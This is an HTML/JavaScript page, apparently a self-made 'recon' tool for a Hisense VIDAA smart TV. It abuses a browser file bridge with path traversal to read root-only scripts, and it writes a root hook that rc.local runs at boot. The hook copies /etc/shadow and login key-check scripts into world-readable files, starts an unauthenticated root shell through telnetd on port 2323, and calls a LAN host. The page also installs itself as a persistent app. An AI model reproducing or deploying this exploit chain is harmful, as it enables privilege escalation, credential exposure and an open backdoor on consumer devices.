<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>recon</title>
<style>
  html, body { margin: 0; padding: 0; background: #000; color: #ccc; }
  #out { font: 19px/1.4 Menlo, Consolas, monospace; white-space: pre-wrap;
         word-break: break-all; padding: 10px; }
  .ok { color: #8f8; } .err { color: #f88; } .warn { color: #fd6; } .hdr { color: #6cf; }
  #btns { position: fixed; top: 6px; right: 6px; z-index: 2; }
  #btns div { display: inline-block; background: #123; color: #6cf; border: 2px solid #6cf;
              padding: 10px 16px; margin-left: 8px; font: bold 18px Menlo, monospace; }
  #hook { background: #301; color: #f88; border-color: #f88; }
</style>
</head>
<body>
<div id="btns">
  <div onclick="location.reload()">RERUN</div>
  <div id="inst">INSTALL AS APP</div>
  <div id="hook">INSTALL ROOT HOOK</div>
</div>
<div id="out"></div>
<script>
(function () {
  "use strict";

  // Recon v8.
  // v7 established: the UART root-shell gate (key_check.sh) in full, the OEM
  // white-name map (data-only), and the root primitive — rc.local executes
  // /var/local/otaTest.sh (root) if present, and /var/local is bridge-writable.
  // v8: reads the openssh/telnetd starter conditions, the superwatch config
  // pointer, the JS-service package manifests, and — behind an explicit
  // button — writes the root hook script.

  var el = document.getElementById("out");
  var report = {
    started: new Date().toISOString(),
    ua: navigator.userAgent,
    marker: {},
    files: {},
    hook: {}
  };

  function trunc(s, n) {
    s = String(s == null ? "" : s);
    return s.length > n ? s.slice(0, n) + "…(" + s.length + " chars)" : s;
  }

  function normMsg(m) {
    if (m == null) return "";
    if (typeof m === "string") return m;
    try { return JSON.stringify(m); } catch (e) { return String(m); }
  }

  function line(text, cls) {
    var d = document.createElement("div");
    d.textContent = text;
    if (cls) d.className = cls;
    el.appendChild(d);
    window.scrollTo(0, document.body.scrollHeight);
  }

  function isOk(ret) {
    if (ret === true) return true;
    if (typeof ret === "number") return ret !== 0;
    if (typeof ret === "string") return ret !== "" && ret !== "0";
    return false;
  }

  function save(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open("POST", "/api/recon", true);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(JSON.stringify({ tag: tag, at: new Date().toISOString(), report: report }));
    } catch (e) { /* screen still shows results */ }
  }

  function hiCall(action, params) {
    try {
      if (typeof HiUtils_createRequest !== "function") return { error: "no bridge" };
      var r = HiUtils_createRequest(action, params);
      if (r && typeof r === "object") {
        return { ret: r.ret, msg: normMsg(r.msg) };
      }
      return { value: trunc(r, 2000) };
    } catch (e) {
      return { exception: String(e) };
    }
  }

  function rd(path) {
    var r = hiCall("fileRead", { path: path, mode: 6 });
    report.files[path] = r;
    return r;
  }

  // The root hook. Runs as root at next boot (rc.local). Harvests root-only
  // intel into world-readable dumps, starts telnetd on 2323, phones home.
  // Remove via: rm /var/local/otaTest.sh (the hook also self-documents).
  var HOOK = [
    "#!/bin/sh",
    "# alvidaa root hook — installed " + report.started,
    "# remove: delete /var/local/otaTest.sh (via recon.html REMOVE ROOT HOOK)",
    "exec > /var/local/otaTest.log 2>&1",
    "date; id; uname -a",
    "ps",
    "netstat -tln 2>/dev/null || busybox netstat -tln 2>/dev/null",
    "find /usr/local /opt /application -maxdepth 3 -iname '*kilby*' 2>/dev/null",
    "ls -la /usr/local/bin/openssh/ 2>/dev/null",
    "mkdir -p /var/local/rootdumps",
    "cp /etc/shadow /var/local/rootdumps/ 2>/dev/null",
    "cp /usr/local/scripts/rootlogin.sh /var/local/rootdumps/ 2>/dev/null",
    "cp /etc/cli_login.sh /var/local/rootdumps/ 2>/dev/null",
    "cp /usr/local/scripts/key_check.sh /var/local/rootdumps/ 2>/dev/null",
    "cp /usr/local/bin/check_usb_key /var/local/rootdumps/ 2>/dev/null",
    "chmod 755 /var/local/rootdumps",
    "chmod 644 /var/local/rootdumps/* 2>/dev/null",
    "busybox telnetd -p 2323 -l /bin/sh 2>/dev/null && echo 'telnetd on 2323'",
    "wget -q -O /dev/null 'http://192.168.0.85:8770/api/state' 2>/dev/null",
    "echo 'hook done'"
  ].join("\n") + "\n";

  function installHook() {
    var status = document.getElementById("hook");
    // refuse if one already exists (never blindly overwrite)
    var cur = hiCall("fileRead", { path: "../var/local/otaTest.sh", mode: 6 });
    if (isOk(cur.ret) && cur.msg.indexOf("alvidaa root hook") === -1) {
      status.textContent = "otaTest.sh EXISTS (foreign) — not overwriting";
      status.style.color = "#f88";
      report.hook = { status: "foreign-file-present", head: trunc(cur.msg, 400) };
      save("hook");
      return;
    }
    var w = hiCall("fileWrite", { path: "../var/local/otaTest.sh", mode: 6,
                                  writedata: HOOK });
    report.hook = { status: isOk(w.ret) ? "written" : "failed", result: w };
    if (isOk(w.ret)) {
      var rb = hiCall("fileRead", { path: "../var/local/otaTest.sh", mode: 6 });
      report.hook.readback_ok = isOk(rb.ret);
      status.textContent = "ROOT HOOK INSTALLED — reboot the TV";
      status.style.color = "#8f8";
    } else {
      status.textContent = "hook write failed: " + trunc(w.msg, 120);
    }
    save("hook");
  }

  var DUMP_TARGETS = [
    "usr/local/bin/openssh/startsshd.sh",
    "usr/local/bin/openssh/starttelnetd.sh",
    "usr/local/scripts/start-superwatch.sh",
    "usr/local/scripts/OEMfacstart.sh",
    "opt/hisenseUI/startgui.sh",
    "APPS/pkgs/tv.vidaa.jsservice.system/CHA/package.json",
    "APPS/pkgs/tv.vidaa.jsservice.basic/CHA/package.json",
    "var/local/otaTest.log",
    "proc/uptime"
  ];

  var PKG_DIR = "../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/";

  function run() {
    line("== alvidaa recon v8 ==");
    line(report.ua);
    save("start");

    // 1. dump targets
    line("-- root service conditions --", "hdr");
    for (var j = 0; j < DUMP_TARGETS.length; j++) {
      var t = DUMP_TARGETS[j];
      var r = rd("../" + t);
      if (isOk(r.ret)) {
        line("[ok] /" + t + " (" + r.msg.length + " b): " + trunc(r.msg, 240), "ok");
      } else {
        line("[--] /" + t + ": " + trunc(r.msg, 90));
      }
    }
    // directory-existence oracle for the openssh dir
    var dirProbe = hiCall("fileRead", { path: "../usr/local/bin/openssh/", mode: 6 });
    report.files["usr/local/bin/openssh/"] = dirProbe;
    line("[dir] /usr/local/bin/openssh/ -> " + trunc(dirProbe.msg, 60) +
      (String(dirProbe.msg).indexOf("EISDIR") !== -1 ? " (EXISTS)" : ""), "warn");
    save("dumps");

    // 2. marker
    var mk = PKG_DIR + ".recon_marker";
    var m0 = hiCall("fileRead", { path: mk, mode: 6 });
    report.marker = {
      path: "/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/.recon_marker",
      existed_before: isOk(m0.ret),
      content: isOk(m0.ret) ? trunc(m0.msg, 200) : null
    };
    line("[marker] " + (isOk(m0.ret) ? "present" : "missing"), "warn");
    save("marker");

    report.finished = new Date().toISOString();
    save("final");
    line("== done ==", "hdr");
  }

  document.getElementById("inst").addEventListener("click", function () {
    var status = document.getElementById("inst");
    try {
      var base = location.href.replace(/recon\.html.*$/, "");
      var icon = base + "icon.png";
      var cur = hiCall("fileRead", { path: "websdk/Appinfo.json", mode: 6 });
      var list = cur.ret ? JSON.parse(cur.msg) : { AppInfo: [] };
      list.AppInfo = list.AppInfo.filter(function (a) { return a.Id !== "vidaa-recon"; });
      list.AppInfo.push({
        Id: "vidaa-recon", AppName: "Recon", Title: "Recon",
        URL: base + "recon.html", StartCommand: base + "recon.html",
        IconURL: icon, Icon_96: icon, Image: icon, Thumb: icon,
        Type: "Browser", InstallTime: "2026-10-29",
        RunTimes: 0, StoreType: "custom", PreInstall: false
      });
      var w = hiCall("fileWrite", { path: "websdk/Appinfo.json", mode: 6,
                                    writedata: JSON.stringify(list) });
      status.textContent = isOk(w.ret) ? "INSTALLED (restart TV)" : "install failed";
      status.style.color = isOk(w.ret) ? "#8f8" : "#f88";
    } catch (e) {
      status.textContent = "install threw: " + String(e);
    }
  });

  document.getElementById("hook").addEventListener("click", installHook);
  run();
})();
</script>
</body>
</html>
